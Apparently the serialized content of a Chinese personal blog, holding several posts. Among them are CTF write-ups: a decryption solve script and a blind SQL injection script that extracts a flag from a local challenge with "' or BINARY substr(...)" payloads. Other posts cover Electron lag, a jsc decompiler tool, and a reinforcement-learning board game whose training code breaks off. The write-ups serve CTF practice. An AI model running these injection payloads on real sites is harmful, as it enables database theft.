        k = [key[key_base_idx ^ i] for i in range(4)]
        key_schedule = [k[0], k[1], k[2], k[3], k[0], k[1], k[2], k[3], k[0], k[1]]
        p = [0] * 10
        p[9] = U32(s[9] - F(s[8], s[0], key_schedule[9], v25))
        p[8] = U32(s[8] - F(s[7], p[9], key_schedule[8], v25))
        p[7] = U32(s[7] - F(s[6], p[8], key_schedule[7], v25))
        p[6] = U32(s[6] - F(s[5], p[7], key_schedule[6], v25))
        p[5] = U32(s[5] - F(s[4], p[6], key_schedule[5], v25))
        p[4] = U32(s[4] - F(s[3], p[5], key_schedule[4], v25))
        p[3] = U32(s[3] - F(s[2], p[4], key_schedule[3], v25))
        p[2] = U32(s[2] - F(s[1], p[3], key_schedule[2], v25))
        p[1] = U32(s[1] - F(s[0], p[2], key_schedule[1], v25))
        p[0] = U32(s[0] - F(p[9], p[1], key_schedule[0], v25))
        s = p
        round_sum = U32(round_sum + delta)
    return s

v10_final = [0x63656F6D, 0x21216674]

key_final = [
    v10_final[0], v10_final[1],
    U32(0x12345678), U32(0x9ABCDEF0)
]

target_cipher_dwords = [
    0x5D624C34, 0x8629FEAD, 0x9D11379B, 0xFCD53211,
    0x460F63CE, 0xC5816E68, 0xFE5300AD, 0x0A0015EE,
    0x9806DBBB, 0xEF4A2648
]

decrypted_dwords = decrypt(target_cipher_dwords, key_final)

flag_bytes = b""
for dword in decrypted_dwords:
    flag_bytes += struct.pack(&#x27;<I&#x27;, dword)

try:
    decoded_flag = flag_bytes.decode(&#x27;ascii&#x27;).strip(&#x27;\\x00&#x27;)
    print(f"Flag: {decoded_flag}")
except UnicodeDecodeError:
    print("error")

## web
### 08 第八章 天衍真言，星图显圣
这里用的是盲注，一开始被大小写坑了，sql字符比较一般不区分大小写......
python60 linescopyimport requests
import string
from urllib.parse import quote

base_url = "http://127.0.0.1:50302/"
success_indicator = "Welcome"
max_retries = 5
request_timeout = 10
max_flag_length = 100

PRIORITY_CHARS = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +  "0123456789" + "_{}[]()!@#$%^&*+-=;:&#x27;\\",.<>/?|\\\\~\` "

def check_payload(payload):
    encoded_payload = quote(payload)
    target_url = f"{base_url}?username={encoded_payload}&password=123"
    
    for attempt in range(max_retries):
        try:
            r = requests.get(target_url, timeout=request_timeout)
            if success_indicator in r.text:
                return True
            return False
        except Exception as e:
            pass
    return False

def extract_flag():
    length = 0
    for l in range(30, 70):
        payload = f"&#x27; or length((select * from flag))={l}-- "
        if check_payload(payload):
            length = l
            print(f"Flag长度: {length}")
            break
    if length == 0:
        length = 50
    flag = ""
    length+=1
    for position in range(1, length + 1):
        found_char = None
        for char in PRIORITY_CHARS:
            # 使用BINARY强制区分大小写
            payload = f"&#x27; or BINARY substr((select * from flag),{position},1)=&#x27;{char}&#x27;-- "
            
            if check_payload(payload):
                found_char = char
                flag += char
                print(f"位置 {position}: {char} | 当前flag: {flag}")
                break
        if found_char is None:
            flag += "?"
    
    return flag

if __name__ == "__main__":
    flag = extract_flag()
    print("flag:", flag)

### 待更......
web太多太杂，不想写了`,ngrog9zb:`最近在打开electron应用时感觉十分卡顿，github desktop给我干到5帧了，什么都点不了，edge开发者工具也是，卡成ppt，打开任务管理器才发现有一个叫mspc的进程一直在吃cpu，把它终止掉之后立刻变流畅了
网上一搜这东西是（微软）电脑管家，于是赶紧去设置里把它卸载了
我记得最开始我的电脑上是没有这个东西的（或者有，但是没闹什么幺蛾子），阿三程序员果然名不虚传😅
不过卸载掉这个电脑管家并没有解决qqnt的卡顿，上网搜了一下是不能启用独显，在启动参数上加个--disable-gpu就好了......`,w3cmceab:`最近在研究Typora的时候需要分析被bytenode加密的jsc文件，如今大多数electron架构的项目为了保护js代码都使用bytenode将js编译成了jsc（例如qq，从major.node中可以提取出jsc，分析一下可以找到一些有趣的东西），而网上的教程和已有的工具（suleram/View8↗）只支持v12.0.1版本以前的v8引擎，之后v8引擎的api发生了较大的改动
对此我编写了下面的项目，提供了12.0.1版本以来所有被node和electron使用过的patched v8，可以将jsc字节码转换为可读的js代码：
xqy2006/jsc2js↗
在仓库README中有详细的使用说明，这里就不再赘述了
注意，可能只对electron中的jsc有效，若是使用node编译出来的jsc，d8会因为找不到node中的builtin对象而报错
目前可能仍有一点小问题，在反编译部分jsc时会报错（有时候会无法从哈希表中获取对象，暂未找到原因），欢迎pr
有了工具，那也应该有些题目来练手，我出了一道：ez_jsc（如果下载太慢，可以从这里下载：蓝奏云↗）
欢迎在评论中分享你的解题过程
不知道以后会不会有ctf题目出jsc逆向呢🤔`,"56zn3lsn":`### 规则设计
游戏灵感来源于一道中考模拟题：
image-20250708154632038
这里说是2×2的正方形网格实际上可以看出3×3的点阵，共9个点可选（下文中所有的n都是对于点阵而非网格）
根据这道题目我重新设计了规则：
棋盘为14×14格点

两人依次在网格中画线段，线段的起点和终点均为格点

新画线段的起点为前一条线段的终点，且与任意已画出线段不能有其他公共点

当某人无法画出新的线段时，则另一人获胜

能量限制：移动距离不能超过当前能量值

为什么是14×14呢？首先相较于原题的3×3，我们显然需要增加棋盘大小以增强策略性，其次我们引入了新的规则：能量限制，这样是为了防止玩家画出超长线段直接分割棋盘，那么再大的棋盘也就没有意义了，我们没必要设置太大的棋盘，我们只需要控制每回合回复的能量的大小即可控制一局游戏的平均步数，鉴于我们需要使游戏能够在小屏幕（手机）上显示，太大的棋盘不方便操作，最后选定了n=14
为了防止囤积能量然后仍然分割棋盘，因此应当鼓励花费能量，这里我们可以增加一个每回合能量衰减的机制，最终设计的能量计算公式为：
$$
E_{turn}=3+0.8E_{turn-1}
$$
### 规则实现
那么接下来，我们可以着手将游戏规则实现出来，因为我们需要训练强化学习模型，因此我们可以先编写一个gym环境，然后暴露接口给模型进行训练，这里我们先构建一个符合当前游戏规则的gym环境：
现在，我们需要思考给模型需要暴露一些什么信息，设置什么奖励提供给模型
首先我们可以将游戏分为3个阶段：
Phase 0：先手玩家选择起点
Phase 1：先手玩家选择终点
Phase 2：对弈

其实这里Phase 1可以和Phase 2可以合并的，但是已经这么写了就先懒得改了

我选择向模型暴露这些信息：
已用点&当前点

双方能量 E₀、E₁

游戏阶段

回合数

线段状态

#### 线段状态压缩
如果直接使用一个n^2*n^2的掩码矩阵来记录线段状态的话，将会产生非常大的维度，因此我们需要将信息进行压缩，这里我将棋盘上的线段进行采样渲染，最后整个棋盘形成一张图，这十分有利于CNN学习图像特征，采样过程中我设置了衰减，以体现能量衰减和游戏进程，下面是一个示意图：
image-20250708161407550
### 奖励设置
我们引入一个概念：一击必胜
由于这个游戏一定会存在制胜的最后一步和导致失败的倒数第二步，因此我们对一击制胜的最后一步设置一个很大的奖励，将导致失败的倒数第二步设置惩罚（此外还可以继续往前追溯倒数第三步第四步进行奖励和惩罚，但是碍于训练模型时的CPU的性能瓶颈，因此目前并没有设置）
此外，当当前步使得对手可活动空间减少时，我们也基于一个小奖励
不暴露漏洞，找到对方的漏洞是这个游戏获胜的关键，因此我们不需要太多其它的奖励指标，最终的奖励设置如下：
┌──────────┬─────────────────┬──────────────┐
│ 奖励类型 │ 计算方式        │ 目的         │
├──────────┼─────────────────┼──────────────┤
│ 空间压制 │ 1 -  对手自由度 │ 限制对手移动 │
│ 漏洞惩罚 │ -3.0            │ 避免危险走法 │
│ 制胜奖励 │ +3.0            │ 鼓励终结游戏 │
└──────────┴─────────────────┴──────────────┘
基于上文所述，我们可以编写完整的game_env.py：
python576 linescopyimport gymnasium as gym
import math, random
import numpy as np
from gymnasium import spaces
import collections

class NoCrossLinesEnv(gym.Env):
    metadata = {&#x27;render_modes&#x27;: [&#x27;human&#x27;], &#x27;render_fps&#x27;: 4}  # 更新 metadata
    
    def __init__(self, n=14, m=3, alpha=0.8, Emax=12):
        
        super().__init__()
        self.n, self.m, self.alpha, self.Emax = n, m, alpha, Emax
        self.action_space = spaces.Discrete(n*n)
        self.segment_state = None
        
        low = np.zeros(n*n*2 + n*n + 4, dtype=np.float32)  # 新增n*n维度
        high = np.ones_like(low, dtype=np.float32)
        self.observation_space = spaces.Box(low, high, dtype=np.float32)
        self.seed()
    
    def seed(self, seed=None):
        self.np_random, seed = gym.utils.seeding.np_random(seed)
        return [seed]
    
    def reset(self, seed=None, options=None):
        # 初始化随机种子
        if seed is not None:
            self.seed(seed)
        
        self.used   = np.zeros(self.n*self.n, dtype=bool)
        self.segs   = []             # list of (a,b)
        self.cur    = None
        self.E      = [0.0, 0.0]
        self.turn   = 0
        self.phase  = 0              # 0=选起点,1=首步,2=对弈中
        self.over   = False
        self.winner = None
        # 初始化线段状态矩阵（n x n）
        self.segment_state = np.zeros((self.n, self.n), dtype=np.float32)
        self.cur_players = [None, None]
        return self._get_obs(), {}  # 返回观察和空字典
    def _update_segment_state(self, a, b):
        """更新线段状态矩阵"""
        xa, ya = self.xy(a)
        xb, yb = self.xy(b)
        
        # 计算线段方向向量
        dx = xb - xa
        dy = yb - ya
        
        # 计算线段长度
        length = max(abs(dx), abs(dy))
        if length == 0:
            return
            
        # 沿线段路径更新状态
        for i in range(length + 1):
            t = i / length
            x = int(round(xa + t * dx))
            y = int(round(ya + t * dy))
            if 0 <= x < self.n and 0 <= y < self.n:
                # 使用线性衰减值表示线段影响
                self.segment_state[y, x] = min(1.0, self.segment_state[y, x] + 0.8 * (1 - t))

    def _get_obs(self):
        u = self.used.astype(np.float32)
        c = np.zeros_like(u)
        if self.cur is not None:
            c[self.cur] = 1.0
        
        # 展平线段状态矩阵并归一化
        seg_flat = self.segment_state.flatten().astype(np.float32)
        
        e0, e1 = self.E[0]/self.Emax, self.E[1]/self.Emax
        p2 = self.phase / 2.0
        t0 = float(self.turn)
        
        # 包含线段状态
        return np.concatenate([u, c, seg_flat, [e0, e1, p2, t0]]).astype(np.float32)

    
    # —— 平面几何 ——  
    def xy(self, i):
        # 返回 (x, y)：x=col, y=row
        return (i % self.n, i // self.n)

    def orient(self, a, b, c):
        xa, ya = self.xy(a); xb, yb = self.xy(b); xc, yc = self.xy(c)
        return (xb - xa)*(yc - ya) - (yb - ya)*(xc - xa)

    def on_segment(self, a, b, c):
        # c 在线段 ab 上（包括端点）
        if self.orient(a, b, c) != 0:
            return False
        xa, ya = self.xy(a); xb, yb = self.xy(b); xc, yc = self.xy(c)
        return (min(xa, xb) <= xc <= max(xa, xb)
                and min(ya, yb) <= yc <= max(ya, yb))

    def segments_intersect(self, a, b, c, d):
        o1 = self.orient(a, b, c)
        o2 = self.orient(a, b, d)
        o3 = self.orient(c, d, a)
        o4 = self.orient(c, d, b)
        if o1*o2 < 0 and o3*o4 < 0:
            return True
        # 端点共线或在对方线上
        if self.on_segment(a, b, c): return True
        if self.on_segment(a, b, d): return True
        if self.on_segment(c, d, a): return True
        if self.on_segment(c, d, b): return True
        return False
    
    # —— 合法走法计算 ——  
    def _legal_moves(self):
        if self.over:
            return []
        # phase 0: 选任意起点
        if self.phase == 0:
            return list(range(self.n*self.n))
        # phase 1: 首步，用 P0 当前能量
        if self.phase == 1:
            ret = []
            for p in range(self.n*self.n):
                if p == self.cur: continue
                d = self.dist(self.cur, p)
                if d <= self.E[0] + 1e-9:
                    ret.append((p, d))
            return ret
        # phase 2: 对弈中，用当前 turn 能量，且不在线段上、不相交
        ret = []
        for p in range(self.n*self.n):
            if p == self.cur or self.used[p]:
                continue
            # 跳过任何在线段上的点（包括内部）
            if any(self.on_segment(a, b, p) for a,b in self.segs):
                continue
            d = self.dist(self.cur, p)
            if d > self.E[self.turn] + 1e-9:
                continue
            # 检查不与已画段相交（允许首尾相连）
            ok = True
            for a,b in self.segs:
                if b == self.cur:
                    continue
                if self.segments_intersect(self.cur, p, a, b):
                    ok = False
                    break
            if ok:
                ret.append((p, d))
        return ret

    def dist(self, i, j):
        xi, yi = self.xy(i); xj, yj = self.xy(j)
        return math.hypot(xi - xj, yi - yj)
    
    
    # 添加动作掩码方法
    def action_mask(self):
        """返回当前状态下合法动作的掩码"""
        mask = np.zeros(self.action_space.n, dtype=bool)
        legal_moves = self._legal_moves()
        
        if self.phase == 0:
            # 所有点都是合法的
            legal_points = legal_moves
        elif legal_moves and isinstance(legal_moves[0], tuple):
            # 提取点索引
            legal_points = [p for p, _ in legal_moves]
        else:
            legal_points = legal_moves
            
        mask[legal_points] = True
        return mask
    
    def _get_opponent_moves(self):
        """获取对手所有可能的合法移动"""
        if self.over:
            return []
        
        # 保存当前状态
        saved_state = self._save_state()
        
        # 切换到对手视角
        self.turn = 1 - self.turn
        self.cur = self.cur_players[self.turn]
        
        # 如果对手位置无效，则没有合法移动
        if self.cur is None:
            self._restore_state(saved_state)
            return []
        
        # 获取合法动作并处理不同返回类型
        lm = self._legal_moves()
        moves = []
        
        if lm:
            # 检查返回类型
            if isinstance(lm[0], tuple):
                # 元组类型 (p, d)
                moves = [p for p, _ in lm]
            else:
                # 整数类型 p
                moves = list(lm)
        
        # 恢复原始状态
        self._restore_state(saved_state)
        
        return moves

    
    def _get_opponent_paths(self):
        """获取对手所有潜在路径（考虑多步）"""
        opponent_pos = self.cur_players[1 - self.turn]
        if opponent_pos is None:
            return []
        
        paths = []
        # 获取对手位置
        x, y = self.xy(opponent_pos)
        
        # 检查8个方向的路径
        for dx, dy in [(0,1), (1,0), (0,-1), (-1,0), (1,1), (1,-1), (-1,1), (-1,-1)]:
            path = []
            for step in range(1, self.n):
                nx, ny = x + dx*step, y + dy*step
                if 0 <= nx < self.n and 0 <= ny < self.n:
                    point = ny * self.n + nx
                    # 检查点是否可用且未被阻塞
                    if not self.used[point] and self.segment_state[ny, nx] < 0.7:
                        path.append(point)
                    else:
                        break
            if path:
                paths.append([opponent_pos] + path)
        return paths

    
    def _save_state(self):
        """保存当前游戏状态"""
        return {
            &#x27;used&#x27;: self.used.copy(),
            &#x27;segs&#x27;: self.segs.copy(),
            &#x27;cur&#x27;: self.cur,
            &#x27;E&#x27;: self.E.copy(),
            &#x27;turn&#x27;: self.turn,
            &#x27;phase&#x27;: self.phase,
            &#x27;over&#x27;: self.over,
            &#x27;winner&#x27;: self.winner,
            &#x27;segment_state&#x27;: self.segment_state.copy(),
            &#x27;cur_players&#x27;: self.cur_players.copy()
        }
    
    def _restore_state(self, state):
        """恢复游戏状态"""
        self.used = state[&#x27;used&#x27;].copy()
        self.segs = state[&#x27;segs&#x27;].copy()
        self.cur = state[&#x27;cur&#x27;]
        self.E = state[&#x27;E&#x27;].copy()
        self.turn = state[&#x27;turn&#x27;]
        self.phase = state[&#x27;phase&#x27;]
        self.over = state[&#x27;over&#x27;]
        self.winner = state[&#x27;winner&#x27;]
        self.segment_state = state[&#x27;segment_state&#x27;].copy()
        self.cur_players = state[&#x27;cur_players&#x27;].copy()
    
    def _apply_action(self, action):
        """模拟应用动作（不检查合法性）"""
        if self.phase == 0:
            self.cur = action
            self.used[action] = True
            self.phase = 1
            self.E[0] = self.m  # 添加能量初始化
        elif self.phase == 1:
            d = self.dist(self.cur, action)
            self.segs.append((self.cur, action))
            self._update_segment_state(self.cur, action)
            self.used[action] = True
            self.E[0] -= d  # 更新能量
            self.cur = action
            self.phase = 2
            self.turn = 1
            # 对手能量补充
            self.E[1] = min(self.Emax, self.alpha * self.E[1] + self.m)
        else:
            d = self.dist(self.cur, action)
            self.segs.append((self.cur, action))
            self._update_segment_state(self.cur, action)
            self.used[action] = True
            self.E[self.turn] -= d  # 更新当前玩家能量
            self.cur = action
            self.turn = 1 - self.turn  # 切换回合
            # 新回合玩家能量补充
            self.E[self.turn] = min(self.Emax, self.alpha * self.E[self.turn] + self.m)

    
    def _is_high_risk_position(self, player=None):
        """检查指定玩家位置是否高风险"""
        if player is None:
            player = 1 - self.turn  # 默认检查对手
        
        pos = self.cur_players[player]
        if pos is None: 
            return False
        # 简化实现：检查是否被三面包围
        if self.cur is None:
            return False
            
        x, y = self.xy(self.cur)
        blocked_sides = 0
        for dx, dy in [(0,1), (1,0), (0,-1), (-1,0)]:
            nx, ny = x + dx, y + dy
            if 0 <= nx < self.n and 0 <= ny < self.n:
                if self.segment_state[ny, nx] > 0.7 or self.used[ny * self.n + nx]:
                    blocked_sides += 1
        return blocked_sides >= 3

    
    def _calculate_opponent_freedom(self):
        # 获取对手所有可能移动路径
        opponent_moves = self._get_opponent_paths()
        
        # 计算每条路径的阻塞程度
        path_scores = []
        for path in opponent_moves:
            path_block = 0
            for i, point in enumerate(path):
                x, y = self.xy(point)
                weight = 1.0 - (i / len(path)) * 0.5  # 起点权重1.0，终点权重0.5
                path_block += self.segment_state[y, x] * weight

            path_scores.append(path_block / len(path))
        
        # 返回最畅通路径的分数（1表示完全自由）
        return 1 - min(path_scores) if path_scores else 0.0
    
    def _check_forcing_move_vulnerability(self, action):
        """检查执行当前动作是否会创造漏洞（添加日志）"""
        #print(f"===== 开始漏洞检测 =====")
        #print(f"当前玩家: P{self.turn}, 动作: {self.xy(action)}")
        #print(f"当前能量: P0={self.E[0]:.2f}, P1={self.E[1]:.2f}")
        
        # 保存状态
        saved_state = self._save_state()
        
        try:
            # 模拟执行当前动作
            #print(f"模拟执行动作: {self.xy(action)}")
            self._apply_action(action)
            
            # 获取对手可能的移动
            opponent_moves = self._get_opponent_moves()
            #print(f"对手可能的移动: {len(opponent_moves)}个")
            
            penalty = 0.0
            found_vulnerability = False
            
            # 检查每个对手移动是否会造成一击制胜
            for i, opponent_move in enumerate(opponent_moves):
                #print(f"检查对手动作 {i+1}/{len(opponent_moves)}: {self.xy(opponent_move)}")
                
                # 检查这个动作是否会造成一击制胜
                if self._would_be_forcing_move(opponent_move):
                    #print(f"  发现漏洞! 对手动作 {self.xy(opponent_move)} 可一击制胜")
                    penalty = -3.0
                    found_vulnerability = True
                    break
            
            if not found_vulnerability:
                #print("  未发现一击制胜漏洞")
                pass
            return penalty
        except Exception as e:
            #print(f"漏洞检测出错: {e}")
            return 0.0
        finally:
            # 恢复状态
            self._restore_state(saved_state)
            #print(f"恢复状态完成")
            #print(f"===== 结束漏洞检测 =====")

    
    def _is_forcing_move(self, action):
        """检查当前动作是否是一击制胜"""
        # 保存当前状态
        saved_state = self._save_state()
        
        # 模拟执行动作
        self._apply_action(action)
        
        # 检查对手是否有合法移动
        has_legal_moves = len(self._legal_moves()) > 0
        
        # 恢复状态
        self._restore_state(saved_state)
        
        return not has_legal_moves
    
    def _would_be_forcing_move(self, move):
        """检查指定动作是否会造成一击制胜"""
        # 保存当前状态
        saved_state = self._save_state()
        
        # 模拟执行动作
        self._apply_action(move)
        
        # 检查是否有合法移动
        has_legal_moves = len(self._legal_moves()) > 0
        
        # 恢复状态
        self._restore_state(saved_state)
        
        return not has_legal_moves
    
    def _calculate_control_ratio(self):
        """计算空间控制比例（基于可达区域）"""
        # 洪水填充计算控制区域
        player_area = self._flood_fill_area(self.cur_players[self.turn])
        opp_area = self._flood_fill_area(self.cur_players[1 - self.turn])
        
        total = player_area + opp_area
        return player_area / total if total > 0 else 0.5
    
    def _flood_fill_area(self, start_point):
        if start_point is None:
            return 0
        
        # 使用集合代替数组（更准确）
        visited = set()
        queue = collections.deque([start_point])
        area = 0
        
        while queue:
            point = queue.popleft()
            if point in visited:
                continue
                
            visited.add(point)
            area += 1
            
            x, y = self.xy(point)
            for dx, dy in [(0,1), (1,0), (0,-1), (-1,0)]:
                nx, ny = x + dx, y + dy
                if 0 <= nx < self.n and 0 <= ny < self.n:
                    neighbor = ny * self.n + nx
                    
                    # 检查是否可通行（考虑线段阻塞）
                    if not self.used[neighbor] and self.segment_state[ny, nx] < 0.7:
                        # 检查路径是否被阻塞
                        if not self._is_line_blocked(x, y, nx, ny):
                            queue.append(neighbor)
        
        return area

    def _is_line_blocked(self, x1, y1, x2, y2):
        """检查两点间直线路径是否被阻塞"""
        dx = x2 - x1
        dy = y2 - y1
        steps = max(abs(dx), abs(dy))
        
        for i in range(1, steps):
            t = i / steps
            x = int(x1 + t * dx)
            y = int(y1 + t * dy)
            if self.segment_state[y, x] > 0.8:
                return True
        return False

    def step(self, action):
        if self.over:
            return self._get_obs(), 0.0, True, False, {}
        
        # —— phase 0: 选起点
        if self.phase == 0:
            # 在phase 0，所有点都是合法的
            if not (0 <= action < self.n * self.n):
                self.over = True
                self.winner = 1
                
                return self._get_obs(), -1.0, True, False, {&#x27;winner&#x27;:1}
            
            p = action
            self.cur = p
            self.used[p] = True
            self.E[0] = self.m
            self.phase = 1
            self.cur_players[0] = self.cur
            return self._get_obs(), 0.0, False, False, {}
        
        # —— phase 1: 首条终点
        if self.phase == 1:
            moves = self._legal_moves()
            mv = next(((p,d) for p,d in moves if p == action), None)
            if mv is None:
                # 非法首步，大惩并结束
                self.over = True
                self.winner = 1
                return self._get_obs(), -1.0, True, False, {&#x27;winner&#x27;:1}
            
            p,d = mv
            self.segs.append((self.cur, p))
            self._update_segment_state(self.cur, p)
            self.used[p] = True
            self.E[0] -= d
            self.cur = p
            # 进入 phase 2
            self.phase = 2
            self.turn  = 1
            # 首次补能给 P1
            self.E[1] = min(self.Emax, self.alpha*self.E[1] + self.m)
            self.cur_players[0] = p
            # 检查 P1 能否走
            if not self._legal_moves():
                self.over   = True
                self.winner = 0
                return self._get_obs(), +1.0, True, False, {&#x27;winner&#x27;:0}
            
            return self._get_obs(), 0.0, False, False, {}
        
        # —— phase 2: 对弈中
        moves = self._legal_moves()
        mv = next(((p,d) for p,d in moves if p == action), None)
        if mv is None:
            # 非法走子
            self.over   = True
            self.winner = 1 - self.turn
            return self._get_obs(), -1.0, True, False, {&#x27;winner&#x27;:self.winner}
        
        p,d = mv
        self.segs.append((self.cur, p))
        self._update_segment_state(self.cur, p)
        self.used[p] = True
        self.E[self.turn] -= d
        self.cur = p
        self.cur_players[self.turn] = p
        # ===== 核心策略奖励 =====
        strategic_reward = 0.0
        opponent = 1 - self.turn
        
        # 1. 空间压制奖励：计算对手被限制的程度
        opp_freedom = self._calculate_opponent_freedom()
        strategic_reward += 0.9 * (1 - opp_freedom)  # 对手自由度越低越好
        
        # 2. 一击制胜检测
        forcing_move_penalty = self._check_forcing_move_vulnerability(action)
        strategic_reward += forcing_move_penalty
        
        # 3. 执行一击制胜奖励
        if self._is_forcing_move(action):
            strategic_reward += 3.0  # 大奖励
        
        # 4. 空间分割奖励（全局控制）
        #control_ratio = self._calculate_control_ratio()
        #strategic_reward += 0.5 * (control_ratio - 0.5)  # [-0.25, 0.25]
        
        # 切换回合
        self.turn ^= 1
        self.E[self.turn] = min(self.Emax, self.alpha*self.E[self.turn] + self.m)
        
        
        # 检查游戏是否结束
        if not self._legal_moves():
            self.over = True
            self.winner = 1 - self.turn
            win_reward = +1.0 if self.winner == 0 else -1.0
            return self._get_obs(), win_reward + strategic_reward, True, False, {&#x27;winner&#x27;: self.winner}
        
        # 返回策略性奖励
        return self._get_obs(), strategic_reward, False, False, {}

    def render(self, mode=&#x27;human&#x27;):
        pass
### 可视化验证
有了环境，我们需要先进行验证，以方便我们检测潜在的错误：
python184 linescopyimport time
import numpy as np
import matplotlib.pyplot as plt
from matplotlib.patches import Rectangle
from game_env import NoCrossLinesEnv

def render_env(env, ax, func_outputs=None):
    """增强版棋盘渲染"""
    n = env.n
    cell = 1.0 / (n - 1)
    ax.clear()
    
    # 1. 画棋盘背景
    ax.add_patch(Rectangle((0, 0), 1, 1, facecolor=&#x27;#f0f0f0&#x27;, edgecolor=&#x27;k&#x27;))
    
    # 2) 画线段
    for a, b in env.segs:
        ya, xa = divmod(a, n)
        yb, xb = divmod(b, n)
        ax.plot([xa*cell, xb*cell], [ya*cell, yb*cell], &#x27;k-&#x27;, lw=2)
    
    # 3) 画点 - 修复点颜色判断
    # 获取合法动作并统一处理格式
    lm = env._legal_moves()
    if lm and isinstance(lm[0], tuple):  # phase 1或2
        legal_points = [p for p, _ in lm]
    else:  # phase 0
        legal_points = list(lm)
    
    for i in range(n*n):
        y, x = divmod(i, n)
        if i == env.cur:
            color = &#x27;red&#x27;
            size = 10
        elif (not env.over) and (not env.used[i]):
            # 使用统一处理后的合法点列表
            color = &#x27;lime&#x27; if i in legal_points else &#x27;black&#x27;
            size = 8 if color == &#x27;lime&#x27; else 4
        else:
            color = &#x27;gray&#x27;
            size = 6
        ax.plot(x*cell, y*cell, &#x27;o&#x27;, color=color, markersize=size)
    
    # 4) 布局和标题
    ax.set_aspect(&#x27;equal&#x27;)
    ax.set_xticks([])
    ax.set_yticks([])
    
    title = f&#x27;P0 E={env.E[0]:.2f} | P1 E={env.E[1]:.2f} | Turn: P{env.turn}&#x27;
    if env.over:
        title = f&#x27;Game Over - Winner: P{env.winner}&#x27;
    ax.set_title(title, fontsize=12)
    
    # 5) 显示辅助信息
    if func_outputs:
        info_text = "Function Outputs:\\n"
        info_text += f"Opp Moves: {len(func_outputs[&#x27;opp_moves&#x27;])}\\n"
        info_text += f"Player Area: {func_outputs[&#x27;player_area&#x27;]}\\n"
        info_text += f"Opp Area: {func_outputs[&#x27;opp_area&#x27;]}"
        ax.text(1.05, 0.5, info_text, transform=ax.transAxes, 
                fontsize=9, verticalalignment=&#x27;center&#x27;)

def validate_functions(env):
    """获取辅助函数输出（不修改状态）"""
    return {
        &#x27;opp_moves&#x27;: env._get_opponent_moves(),
        &#x27;player_area&#x27;: env._flood_fill_area(env.cur_players[env.turn]),
        &#x27;opp_area&#x27;: env._flood_fill_area(env.cur_players[1 - env.turn])
    }

def interactive_validation(env, max_steps=50):
    """交互式验证模式"""
    env.reset()
    plt.ion()
    fig, ax = plt.subplots(figsize=(12, 8))
    
    for step in range(max_steps):
        if env.over:
            print("Game Over!")
            break
            
        # 获取合法动作并处理格式
        lm = env._legal_moves()
        if not lm:
            print("No legal moves!")
            break
        
        # 处理不同阶段返回类型
        if isinstance(lm[0], tuple):  # phase 1或2
            legal = [p for p, _ in lm]
        else:  # phase 0
            legal = list(lm)
        
        # 随机选择动作
        action = np.random.choice(legal)
        x, y = env.xy(action)
        
        # 获取辅助信息
        func_outputs = validate_functions(env)
        
        # 渲染环境
        render_env(env, ax, func_outputs)
        print(f"\\nStep {step}: Action ({x}, {y})")
        print(f"Func Outputs: {func_outputs}")
        
        # 执行动作并获取env计算的奖励
        _, reward, done, _, info = env.step(action)
        print(f"Env Reward: {reward:.4f}")
        
        # 等待用户输入
        if input("Press Enter to continue (q to quit): ").lower() == &#x27;q&#x27;:
            break
            
    plt.ioff()

def last_steps_validation(env, max_steps=100):
    """模拟随机游戏并显示最后4步的详细信息"""
    env.reset()
    plt.ion()
    fig, ax = plt.subplots(figsize=(12, 8))
    
    print("===== 最后4步验证模式 =====")
    history = []
    
    for step in range(max_steps):
        if env.over:
            break
            
        # 安全获取合法动作
        try:
            lm = env._legal_moves()
            if not lm:
                print("没有合法动作!")
                break
                
            # 处理不同阶段返回类型
            if isinstance(lm[0], tuple):  # phase 1或2
                legal = [p for p, _ in lm]
            else:  # phase 0
                legal = list(lm)
                
            action = np.random.choice(legal)
            
            # 执行动作并记录
            obs, reward, done, _, info = env.step(action)
            history.append({
                &#x27;step&#x27;: step,
                &#x27;action&#x27;: action,
                &#x27;reward&#x27;: reward,
                &#x27;state&#x27;: env._save_state()
            })
            
            # 渲染
            render_env(env, ax)
            plt.pause(0.5)
            
        except Exception as e:
            print(f"步骤 {step} 出错: {e}")
            break
    
    plt.ioff()
    
    # 显示最后4步详情
    last_4 = history[-4:] if len(history) >=4 else history
    for step in last_4:
        print(f"\\n步骤 {step[&#x27;step&#x27;]}:")
        print(f"动作: {env.xy(step[&#x27;action&#x27;])}")
        print(f"奖励: {step[&#x27;reward&#x27;]:.2f}")
        print(f"能量: P0={step[&#x27;state&#x27;][&#x27;E&#x27;][0]:.2f}, P1={step[&#x27;state&#x27;][&#x27;E&#x27;][1]:.2f}")
    
    return history

if __name__ == "__main__":
    env = NoCrossLinesEnv(n=14, m=3, alpha=0.8, Emax=12)
    
    print("选择模式:")
    print("1. 交互式验证")
    print("2. 最后4步验证")
    choice = input("选择 (1-2): ")

    if choice == &#x27;1&#x27;:
        interactive_validation(env)
    else:
        last_steps_validation(env)
#### 先手优势？
我们刚刚的可视化验证就是使用蒙特卡洛方法进行决策的，进行大量重复对局后发现：
image-20250708163115017
先后手胜率是一样的，因此游戏应该是相对公平的
### 模型设计与训练
这里我们选用Maskable PPO算法，其中策略网络和价值网络无需我们设计，我们只需要自定义特征提取器将信息转化为矩阵即可：
image-20250708163228081
可以发现我将特征提取器分为了两路，离散数值特征使用全连接网络即可，线段状态我们之前已经压缩为了图，因此使用了卷积网络，最后再进行特征融合
之后我们可以编写训练脚本：
python438 linescopyimport os
import time
import math
import numpy as np
import torch
import torch.nn as nn
from stable_baselines3 import PPO
from stable_baselines3.common.vec_env import DummyVecEnv, SubprocVecEnv
from stable_baselines3.common.callbacks import BaseCallback
from stable_baselines3.common.torch_layers import BaseFeaturesExtractor
from sb3_contrib import MaskablePPO
from sb3_contrib.common.maskable.policies import MaskableActorCriticPolicy
from sb3_contrib.common.maskable.utils import get_action_masks
from sb3_contrib.common.wrappers import ActionMasker
from game_env import NoCrossLinesEnv

# 自定义神经网络架构 - 参数增大4倍
class CustomCNN(BaseFeaturesExtractor):
    def __init__(self, observation_space, features_dim=1024):  # 特征维度从256增大到1024
        super().__init__(observation_space, features_dim)
        self.n_input = observation_space.shape[0]
        
        # 从观察空间推断棋盘大小 n
        total_dim = observation_space.shape[0]
        self.n = 14
        self.segment_size = self.n * self.n
        
        # 点信息部分: 已用点 + 当前点 + 能量/阶段/回合信息
        point_info_dim = 2 * self.segment_size + 4
        
        # 线段状态部分: n x n 网格 - 通道数增大4倍
        self.segment_net = nn.Sequential(
            nn.Conv2d(1, 64, kernel_size=3, stride=1, padding=1),  # 16->64
            nn.ReLU(),
            nn.MaxPool2d(2),
